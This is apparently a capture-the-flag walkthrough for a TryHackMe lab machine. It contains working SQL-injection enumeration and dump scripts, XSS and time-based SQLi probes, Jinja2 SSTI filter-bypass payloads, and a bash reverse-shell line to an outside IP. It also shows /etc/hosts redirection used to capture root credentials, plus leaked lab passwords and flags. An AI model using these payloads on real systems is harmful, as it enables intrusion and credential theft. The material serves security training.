

# PORT SCAN
---


| PORT | SERVICE |
| :--- | :------ |
| 22   | SSH     |
| 8000 | HTTP    |



# RECONNAISSANCE
---

We can add `second.thm` to `/etc/hosts` so its easier to work:

```bash
echo 'IP second.thm' | sudo tee -a /etc/hosts
```

If we check the web application, we can find this:

![Pasted image 20250805175801.png](../../IMAGES/Pasted%20image%2020250805175801.png)

We got a login page, if you've made previous hard machines on tryhackme, you will notice this is the same login page as the `K2` machine, that machine had SQLI, XSS and more stuff, let's begin by creating an account:

```
test123 / test123456
```


![Pasted image 20250805175805.png](../../IMAGES/Pasted%20image%2020250805175805.png)


![Pasted image 20250805175809.png](../../IMAGES/Pasted%20image%2020250805175809.png)


Once we login, we can find this:

![Pasted image 20250805175814.png](../../IMAGES/Pasted%20image%2020250805175814.png)

We can count words, pretty weird, let's send a test request and analyze the behavior:

![Pasted image 20250805175818.png](../../IMAGES/Pasted%20image%2020250805175818.png)

We can see that with `test`, we get the following response:

```
There is only 1 word test123.
```

Our username is `reflected` here, we can test by embedding a `xss` payload on a test account, let's create another one:

```js
%0d%0a%20"><img src=q onerror=alert(1)> / testxss123
```

If we send a request with that account, we see that some characters are being filtered in order to avoid xss exploits:

![Pasted image 20250805175834.png](../../IMAGES/Pasted%20image%2020250805175834.png)

So, `XSS` may not be it, we know that our input gets reflected on the page so, what about `SQLI`:

```
orwa'XOR(if(now()=sysdate()%2Csleep(15)%2C0))XOR'Z / testsqli1
```

If we send the same request, we get an internal server error:

![Pasted image 20250805175853.png](../../IMAGES/Pasted%20image%2020250805175853.png)

This page is vulnerable to SQLI, seems like the login page points directly to the database and uses an unsafe sql query to retrieve the username once we retrieve the words count, we can begin exploitation.


# EXPLOITATION
---

We already know we need to register an username for each attempt we try to do, this is a big hassle to perform manually, we can do the same with the following python script:

```python
import requests
import sys
import random
import string
from colorama import Fore, Style, init

init(autoreset=True)  

def find_column(url):
    print(f"{Fore.CYAN}[*] Starting column count enumeration via SQLi on: {url}\n")
    
    base = "' UNION SELECT "
    for col_count in range(1, 10):
        payload = base + ",".join(str(i) for i in range(1, col_count + 1)) + "-- -"

        print(f"{Fore.YELLOW}[+] Testing column count: {col_count} with payload: {Fore.MAGENTA}{payload}")

        session = requests.Session()
        email = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10)) + "@test.com"

        # Registration step
        register_data = {
            "username": payload,
            "password": "password123",
            "email": email
        }
        register_url = f"{url}/register"
        session.post(register_url, data=register_data)

        # Login step
        login_data = {
            "username": payload,
            "password": "password123"
        }
        login_url = f"{url}/login"
        session.post(login_url, data=login_data)

        # Submit to vulnerable text box
        box_data = {
            "text_box": "sqli_test"
        }
        response = session.post(login_url, data=box_data)

        if response.status_code == 200:
            print(f"\n{Fore.GREEN}[✔] SUCCESS! Column count is likely: {col_count}")
            print(f"{Fore.CYAN}[+] Working payload: {Fore.MAGENTA}{payload}")
            print(f"{Fore.CYAN}[+] Login credentials:")
            print(f"    {Fore.YELLOW}Username: {payload}")
            print(f"    {Fore.YELLOW}Password: password123\n")
            break
        else:
            print(f"{Fore.RED}[-] Column count {col_count} failed (status: {response.status_code})\n")

def banner():
    print(f"""{Fore.LIGHTBLUE_EX}
    ╔══════════════════════════════════════╗
    ║  SQLi Column Count Enumerator    ║
    ║  Author: smooth                  ║
    ╚══════════════════════════════════════╝
    """)

if __name__ == "__main__":
    try:
        banner()
        target_url = sys.argv[1].rstrip("/")
        find_column(target_url)
    except IndexError:
        print(f"{Fore.RED}Usage: python3 enumerate_sqli.py http://<target>")
```

If you don't have `colorama`, install it with:

```
# This is totally optional, its just for colors, you can use an ai to remove the colors if you don't want to install colorama:

pip3 install colorama
```

Once we use the script, we find the amount of columns this database has:

```python
python3 enumerate_sqli.py 'http://10.201.101.141:8000/'

    ╔══════════════════════════════════════╗
    ║  SQLi Column Count Enumerator        ║
    ║  Author: smooth                      ║
    ╚══════════════════════════════════════╝
    
[*] Starting column count enumeration via SQLi on: http://10.201.101.141:8000

[+] Testing column count: 1 with payload: ' UNION SELECT 1-- -
[-] Column count 1 failed (status: 500)

[+] Testing column count: 2 with payload: ' UNION SELECT 1,2-- -
[-] Column count 2 failed (status: 500)

[+] Testing column count: 3 with payload: ' UNION SELECT 1,2,3-- -
[-] Column count 3 failed (status: 500)

[+] Testing column count: 4 with payload: ' UNION SELECT 1,2,3,4-- -

[✔] SUCCESS! Column count is likely: 4
[+] Working payload: ' UNION SELECT 1,2,3,4-- -
[+] Login credentials:
    Username: ' UNION SELECT 1,2,3,4-- -
    Password: password123
```

![Pasted image 20250805175903.png](../../IMAGES/Pasted%20image%2020250805175903.png)

If we login with the credentials provided by the script and send a word count, we can find this:

![Pasted image 20250805180042.png](../../IMAGES/Pasted%20image%2020250805180042.png)

We get:

```
There is only 1 word 2. 
```

Which means that it seems like the second column is the one we can write, with that in our mind, we can either do it manually or automatically with a script, let's go with the script section for an easier exploitation, let's begin by reading `information_schema.schemata`:

```python
import requests
import sys
import random
import string
import re
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

def sqli(url, injection):
    s = requests.Session()
    N = 7
    email = ''.join(random.choices(string.ascii_uppercase + string.digits, k=N))
    
    register_data = {
        "username": injection,
        "password": "password",
        "email": str(email) + "@test.com"
    }

    register_url = url + "/register"
    print(Fore.YELLOW + f"[+] Sending registration with injection payload...")
    register = s.post(register_url, data=register_data)

    login_data = {
        "username": injection,
        "password": "password"
    }

    login_url = url + "/login"
    print(Fore.YELLOW + f"[+] Logging in with injected user...")
    home = s.post(login_url, data=login_data)

    box_data = {
        "text_box": "fasdfasd"
    }

    print(Fore.YELLOW + f"[+] Triggering SQLi through text box post-login...")
    box = s.post(login_url, data=box_data)

    search = re.compile(r"<p id=results>(.*?)</p>", re.DOTALL)
    match = search.search(box.text)
    
    if match:
        output = match.group(1).strip()
        print(Fore.GREEN + "[+] SQLi successful! Dumped data:\n")
        print(Fore.CYAN + output)
    else:
        print(Fore.RED + "[-] SQLi failed or no results found.")

if __name__ == "__main__":
    try:
        url = sys.argv[1]
        injectiondb = "' union select 1,(select group_concat(SCHEMA_NAME,\"\r\n\") from Information_Schema.SCHEMATA),3,4-- -"
        print(Fore.BLUE + f"[*] Target: {url}")
        print(Fore.BLUE + f"[*] Using injection: {injectiondb}")
        sqli(url, injectiondb)
    except IndexError:
        print(Fore.RED + "Usage: python3 sqli_exploit.py http://target/")

```

We know that the information of the `sqli` payload is reflected between `<p id=results>` based on our proxy's response:

![Pasted image 20250805180053.png](../../IMAGES/Pasted%20image%2020250805180053.png)

So we need to grab the output from it, once we use the payload, we can see this:

```python
python3 sqli_exploit.py 'http://10.201.101.141:8000/'
[*] Target: http://10.201.101.141:8000/
[*] Using injection: ' union select 1,(select group_concat(SCHEMA_NAME,"
") from Information_Schema.SCHEMATA),3,4-- -                                                                                                                                                                                                
[+] Sending registration with injection payload...
[+] Logging in with injected user...
[+] Triggering SQLi through text box post-login...
[+] SQLi successful! Dumped data:

There is only 1 word information_schema
,performance_schema                                                                                                                                                                                                                         
,website                                                                                                                                                                                                                                    
,second_project                                                                                                                                                                                                                             
,dev_site                                                                                                                                                                                                                                   
.                                                                                                                                                        
```

It worked, we can see some stuff, let's try reading the tables on `website` to check if any usernames can be found here:

```python
import requests
import sys
import random
import string
import re
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

def sqli(url, injection):
    s = requests.Session()
    N = 7
    email = ''.join(random.choices(string.ascii_uppercase + string.digits, k=N))
    
    register_data = {
        "username": injection,
        "password": "password",
        "email": str(email) + "@test.com"
    }

    register_url = url + "/register"
    print(Fore.YELLOW + f"[+] Sending registration with injection payload...")
    register = s.post(register_url, data=register_data)

    login_data = {
        "username": injection,
        "password": "password"
    }

    login_url = url + "/login"
    print(Fore.YELLOW + f"[+] Logging in with injected user...")
    home = s.post(login_url, data=login_data)

    box_data = {
        "text_box": "fasdfasd"
    }

    print(Fore.YELLOW + f"[+] Triggering SQLi through text box post-login...")
    box = s.post(login_url, data=box_data)

    search = re.compile(r"<p id=results>(.*?)</p>", re.DOTALL)
    match = search.search(box.text)
    
    if match:
        output = match.group(1).strip()
        print(Fore.GREEN + "[+] SQLi successful! Dumped data:\n")
        print(Fore.CYAN + output)
    else:
        print(Fore.RED + "[-] SQLi failed or no results found.")

if __name__ == "__main__":
    try:
        url = sys.argv[1]
        injectiondb = "' union select 1,(select group_concat(TABLE_NAME,\":\",COLUMN_NAME,\"\r\n\") from Information_Schema.COLUMNS where TABLE_SCHEMA = 'website'),3,4-- -"
        print(Fore.BLUE + f"[*] Target: {url}")
        print(Fore.BLUE + f"[*] Using injection: {injectiondb}")
        sqli(url, injectiondb)
    except IndexError:
        print(Fore.RED + "Usage: python3 sqli_exploit.py http://target/")

```

We get:

```python
python3 sqli_exploit.py 'http://10.201.101.141:8000/'
[*] Target: http://10.201.101.141:8000/
[*] Using injection: ' union select 1,(select group_concat(TABLE_NAME,":",COLUMN_NAME,"
") from Information_Schema.COLUMNS where TABLE_SCHEMA = 'website'),3,4-- -                                                                                                                                                                  
[+] Sending registration with injection payload...
[+] Logging in with injected user...
[+] Triggering SQLi through text box post-login...
[+] SQLi successful! Dumped data:

There is only 1 word users:email
,users:id                                                                                                                                                                                                                                   
,users:password                                                                                                                                                                                                                             
,users:username                                                                                                                                                                                                                             
.
```


Nice, we got passwords and usernames here, we can get them, let's modify our exploit one last time:

```python
import requests
import sys
import random
import string
import re
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

def sqli(url, injection):
    s = requests.Session()
    N = 7
    email = ''.join(random.choices(string.ascii_uppercase + string.digits, k=N))
    
    register_data = {
        "username": injection,
        "password": "password",
        "email": str(email) + "@test.com"
    }

    register_url = url + "/register"
    print(Fore.YELLOW + f"[+] Sending registration with injection payload...")
    register = s.post(register_url, data=register_data)

    login_data = {
        "username": injection,
        "password": "password"
    }

    login_url = url + "/login"
    print(Fore.YELLOW + f"[+] Logging in with injected user...")
    home = s.post(login_url, data=login_data)

    box_data = {
        "text_box": "fasdfasd"
    }

    print(Fore.YELLOW + f"[+] Triggering SQLi through text box post-login...")
    box = s.post(login_url, data=box_data)

    search = re.compile(r"<p id=results>(.*?)</p>", re.DOTALL)
    match = search.search(box.text)
    
    if match:
        output = match.group(1).strip()
        print(Fore.GREEN + "[+] SQLi successful! Dumped data:\n")
        print(Fore.CYAN + output)
    else:
        print(Fore.RED + "[-] SQLi failed or no results found.")

if __name__ == "__main__":
    try:
        url = sys.argv[1]
        injectiondb = "' union select 1,(select group_concat(username,\":\",password,\"\r\n\") from website.users),3,4-- -"
        print(Fore.BLUE + f"[*] Target: {url}")
        print(Fore.BLUE + f"[*] Using injection: {injectiondb}")
        sqli(url, injectiondb)
    except IndexError:
        print(Fore.RED + "Usage: python3 sqli_exploit.py http://target/")

```

We get:

```python
python3 sqli_exploit.py 'http://10.201.101.141:8000/'
[*] Target: http://10.201.101.141:8000/
[*] Using injection: ' union select 1,(select group_concat(username,":",password,"
") from website.users),3,4-- -                                                                                                                                                                                                              
[+] Sending registration with injection payload...
[+] Logging in with injected user...
[+] Triggering SQLi through text box post-login...
[+] SQLi successful! Dumped data:

There is only 1 word smokey:Sm0K3s_Th3C@t
,&#39; union select NULL,NULL,NULL-- -:password123                                                                                                                                                                                          
,&#39; union select NULL,NULL,NULL,NULL-- -:password123                                                                                                                                                                                     
,&#39; union select NULL,NULL,NULL,NULL,NULL-- -:password123                                                                                                                                                                                
,&#39; union select NULL,NULL,NULL,NULL,NULL,NULL-- -:password123                                                                                                                                                                           
,&#39; union select NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -:password123                                                                                                                                                                      
,&#39; union select NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -:password123                                                                                                                                                                 
,&#39; union select NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -:password123                                                                                                                                                            
,&#39; union select NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -:password123                                                                                                                                                       
,&#39; union select 1-- -:password123                                                                                                                                                                                                       
,&#39; union select 1,2-- -:password123                                                                                                                                                                                                     
,&#39; union select 1,2,3-- -:password123                                                                                                                                                                                                   
,&#39; union select 1,2,3,4-- -:password123                                                                                                                                                                                                 
,&#39; union select 1,(select group_concat(SCHEMA_NAME,&#34;                                                                                                                                                                                
&#34;) from Information_Schema.SCHEMATA),3,4-- -:password                                                                                                                                                                                   
,&#39; union select 1,(select group_concat(TABLE_NAME,&#34;:&#34;,COLUMN_NAME,&#34;                                                                                                                                                         
&#34;) from Information_Schema.COLUMNS where TABLE_SCHEMA = &#39;website&#39;),3,4-- -:password                                                                                                                                             
.&#39; union select 1,(select group_concat(username,&#34;:&#34;,password,&#34; 
```

![Pasted image 20250805180104.png](../../IMAGES/Pasted%20image%2020250805180104.png)


We got a set of credentials aside from our test accounts:

```
smokey / Sm0K3s_Th3C@t
```

Let's try to go into ssh with these:


![Pasted image 20250805180108.png](../../IMAGES/Pasted%20image%2020250805180108.png)


Nice, we got access to ssh, time to begin privilege escalation.



# PRIVILEGE ESCALATION
---

If we use `linpeas` we can find this:

![Pasted image 20250805180121.png](../../IMAGES/Pasted%20image%2020250805180121.png)

![Pasted image 20250805180124.png](../../IMAGES/Pasted%20image%2020250805180124.png)

There's another application running on port `5000` as `hazel`, let's check the source code of it:

```python
from flask import Flask, render_template, request, redirect, url_for, session, render_template_string
from flask_mysqldb import MySQL
import MySQLdb.cursors
import re


app = Flask(__name__)

app.secret_key = '$uper@W3s0m3K3y!'

app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'smokey'
app.config['MYSQL_PASSWORD'] = '$tr0nG_P@sS_W0rD@!'
app.config['MYSQL_DB'] = 'second_project'

mysql = MySQL(app)

@app.route('/')
@app.route('/login', methods =['GET', 'POST'])
def login():
        msg = ''
        blacklist = ["config","self","_",'"']
        if request.method == 'POST' and 'username' in request.form and 'password' in request.form:
                username = request.form['username']
                password = request.form['password']
                cursor = mysql.connection.cursor(MySQLdb.cursors.DictCursor)
                cursor.execute('SELECT * FROM users WHERE username = % s AND password = % s', (username, password, ))
                account = cursor.fetchone()
                for check in blacklist:
                    if check in username:
                        msg = "WAF test"
                        return render_template_string(msg)
                if account:
                        session['loggedin'] = True
                        session['id'] = account['id']
                        session['username'] = account['username']
                        msg = '''<!-- Store this code in 'index.html' file inside the 'templates' folder-->

<html>
        <head>
                <meta charset="UTF-8">
                <title> Index </title>
                <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
        </head>
        <body></br></br></br></br></br>
                <div align="center">
                <div align="center" class="border">
                        <div class="header">
                                <h1 class="word">Index</h1>
                        </div></br></br></br>
                                <h1 class="bottom">
                                        Hi %s!!</br></br> Welcome to the index page...
                                </h1></br></br></br>
                                <a href="{{ url_for('logout') }}" class="btn">Logout</a>
                </div>
                </div>
        </body>
</html>'''% session['username']
                        return render_template_string(msg)
                else:
                        msg = 'Incorrect username / password !'
        return render_template('login.html', msg = msg)

@app.route('/logout')
def logout():
        session.pop('loggedin', None)
        session.pop('id', None)
        session.pop('username', None)
        return redirect(url_for('login'))

@app.route('/register', methods =['GET', 'POST'])
def register():
        msg = ''
        if request.method == 'POST' and 'username' in request.form and 'password' in request.form and 'email' in request.form :
                username = request.form['username']
                password = request.form['password']
                email = request.form['email']
                cursor = mysql.connection.cursor(MySQLdb.cursors.DictCursor)
                cursor.execute('SELECT * FROM users WHERE username = % s', (username, ))
                account = cursor.fetchone()
                if account:
                        msg = 'Account already exists !'
                elif not re.match(r'[^@]+@[^@]+\.[^@]+', email):
                        msg = 'Invalid email address !'
                elif not username or not password or not email:
                        msg = 'Please fill out the form !'
                else:
                        cursor.execute('INSERT INTO users VALUES (NULL, % s, % s, % s)', (username, password, email, ))
                        mysql.connection.commit()
                        msg = 'You have successfully registered !'
        elif request.method == 'POST':
                msg = 'Please fill out the form !'
        return render_template('register.html', msg = msg)

if __name__=="__main__":
    app.run("127.0.0.1",5000)
```

If we analyze the code we notice there's a `ssti` vulnerability here on the `login` function, specifically here:

```python
msg = '''<!-- Store this code in 'index.html' file inside the 'templates' folder-->

<html>
        <head>
                <meta charset="UTF-8">
                <title> Index </title>
                <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
        </head>
        <body></br></br></br></br></br>
                <div align="center">
                <div align="center" class="border">
                        <div class="header">
                                <h1 class="word">Index</h1>
                        </div></br></br></br>
                                <h1 class="bottom">
                                        Hi %s!!</br></br> Welcome to the index page...
                                </h1></br></br></br>
                                <a href="{{ url_for('logout') }}" class="btn">Logout</a>
                </div>
                </div>
        </body>
</html>'''% session['username']
                        return render_template_string(msg)
```

That `render_template_string()` call takes the entire HTML (with Jinja2 tags) and whatever we’ve injected into `%s` (our username) and runs it through the Jinja2 engine. That means **any** `{{ … }}` or `{% … %}` in our username gets executed on the server.

Let's forward the port onto our machine and test this `ssti`:

```bash
ssh -L 5000:127.0.0.1:5000 smokey@second.thm
```

![Pasted image 20250805180205.png](../../IMAGES/Pasted%20image%2020250805180205.png)

So, based on the code, we can test `jinja2 SSTI` and it'll succeed, let's try the base payload for this engine:

```
{{7*7}}
```

![Pasted image 20250805180208.png](../../IMAGES/Pasted%20image%2020250805180208.png)

If we login, we find this:

![Pasted image 20250805180212.png](../../IMAGES/Pasted%20image%2020250805180212.png)

There we go, it works, since we know this runs as the `hazel` user, we can send ourselves a reverse shell exploiting this ssti, create an account with this username:

```python
{{ ''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['os'].system('bash -c "bash -i >& /dev/tcp/10.14.21.28/4444 0>&1"') }}
```

If we send the request, it gets triggered by a cheap WAF on the code, if we take a look again, the blacklist is:

![Pasted image 20250805180233.png](../../IMAGES/Pasted%20image%2020250805180233.png)

```python
blacklist = ["config","self","_",'"']
```

We need a bypass for this, let's search any `jinja2 ssti bypass` payloads:

![Pasted image 20250805180238.png](../../IMAGES/Pasted%20image%2020250805180238.png)

We can find this article:

https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f

And specifically, this payload:

![Pasted image 20250805180253.png](../../IMAGES/Pasted%20image%2020250805180253.png)

Let's create an account with that to test `rce` works without being filtered by the blacklist:

```python
{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(287)('ls',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('decode')('utf-8')}}
```

![Pasted image 20250805180258.png](../../IMAGES/Pasted%20image%2020250805180258.png)

Ok, `rce` works, it executed `ls` with success, we need a way to get a reverse shell with this, in order to do this, we'll create a reverse shell file and have it executed through the ssti, create a file with this content:

```bash
bash -c 'bash -i >& /dev/tcp/10.14.21.28/4444 0>&1'
```

I'll create it inside of `/dev/shm`:

```
smokey@ip-10-201-101-141:/dev/shm$ nano rev.sh
smokey@ip-10-201-101-141:/dev/shm$ ls
rev.sh
```

Now we're good to go, let's use the following payload and fire up our listener:

```python
{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(287)('bash /dev/shm/rev.sh &',shell=True)}}
```

Once we create the account and login, we can see this:

![Pasted image 20250805180305.png](../../IMAGES/Pasted%20image%2020250805180305.png)

In our listener, we get the connection:

![Pasted image 20250805180309.png](../../IMAGES/Pasted%20image%2020250805180309.png)


Inside of our home, we can find a note:

```
hazel@ip-10-201-101-141:~$ cat note.txt 
Hello Hazel

Please finish the second project site as soon as possible. Make sure the WAF actually stops all attacks and that you are using the proper render template to avoid SSTI. You really should make your site secure like my word counter.

Also, I need you to put a pep in your step on that PHP site, I will be logging in to check your progress on it.

Sincerely,
Smokey 
```

`Smokey` says that he will be logging inside of a `php` site, if we remember our `linpeas` scan, something is running on port `8080`, that must be the site that smokey logs into, if we run linpeas again as `hazel`, we notice we got some files with `acls` as this user:

![Pasted image 20250805180314.png](../../IMAGES/Pasted%20image%2020250805180314.png)

Let's forward the `8080` port, we can either use `chisel` or `ssh` again with the `smokey` credentials, this is supposed to be a login page based on the note:

```
ssh -L 8888:127.0.0.1:8080 smokey@second.thm
```

![Pasted image 20250805180318.png](../../IMAGES/Pasted%20image%2020250805180318.png)

Exactly, based on the note, smokey's logging to check the progress of the site, what if this runs as a cronjob, let's use `pspy` to check:

![Pasted image 20250805180322.png](../../IMAGES/Pasted%20image%2020250805180322.png)

There it is, each minute a `/root/check_site.py` script is being run, remember we got `acl` as hazel, let's check if we can modify `/etc/hosts`, if we can, we can point our IP into the site being run at port `8080` and check if the requests goes through a python server we set up:

```bash
getfacl -a /etc/hosts
getfacl: Removing leading '/' from absolute path names
# file: etc/hosts
# owner: root
# group: adm
user::rw-
user:hazel:rw-
group::r--
mask::rw-
other::r--
```

Nice, we can modify it, let's check it out first:

```
cat /etc/hosts
127.0.0.1 localhost dev_site.thm
127.0.1.1 second

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

We need to modify `dev_site.thm` to point our IP address, then we need to start a python server:

![Pasted image 20250805180326.png](../../IMAGES/Pasted%20image%2020250805180326.png)

Now, start a python server at port `8080`:

![Pasted image 20250805180329.png](../../IMAGES/Pasted%20image%2020250805180329.png)

A request on the machine is made due to the script running as a cronjob, it must be trying to log in but since we lack a `index.html` it can't authenticate, in order to get the credentials on authentication, let's copy the `index.html` file from the site and copy it. then we can host the server again:

```html

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
	body{ font: 14px sans-serif; }
	.wrapper{ width: 360px; padding: 20px; }
    </style>
</head>
<body>
    <div class="wrapper">
	<h2>User Login</h2>
	<p>Please fill in your credentials to login.</p>


	<form action="/index.php" method="post">
	    <div class="form-group">
		<label>Username</label>
		<input type="text" name="username" class="form-control " value="">
		<span class="invalid-feedback"></span>
	    </div>    
	    <div class="form-group">
		<label>Password</label>
		<input type="password" name="password" class="form-control ">
		<span class="invalid-feedback"></span>
	    </div>
	    <div class="form-group">
		<input type="submit" class="btn btn-primary" value="Login">
	    </div>
	</form>
    </div>
</body>
</html>
```

![Pasted image 20250805180333.png](../../IMAGES/Pasted%20image%2020250805180333.png)

A post request is made, if we capture the traffic with wireshark, we can see the requests:

![Pasted image 20250805180338.png](../../IMAGES/Pasted%20image%2020250805180338.png)

![Pasted image 20250805180341.png](../../IMAGES/Pasted%20image%2020250805180341.png)

Nice, we found the password which must be the root one:

```
A1lw%40ys_C0m1nG_1N_2nd%21%21
```

We need to decode it:

![Pasted image 20250805180345.png](../../IMAGES/Pasted%20image%2020250805180345.png)

Real password is:

```
A1lw@ys_C0m1nG_1N_2nd!!
```

Time to switch into root:

![Pasted image 20250805180349.png](../../IMAGES/Pasted%20image%2020250805180349.png)

We can finally get both flags and end the CTF:

```
root@ip-10-201-101-141:~# cat /home/hazel/user.txt 
THM{WaF_wAf_2nd_0rd3r_SQl_1nJ3ct1on}

root@ip-10-201-101-141:~# cat /root/root.txt
THM{M1nd_Y0uR_AcC3s$_C0nTr0l}
```

![Pasted image 20250805180353.png](../../IMAGES/Pasted%20image%2020250805180353.png)

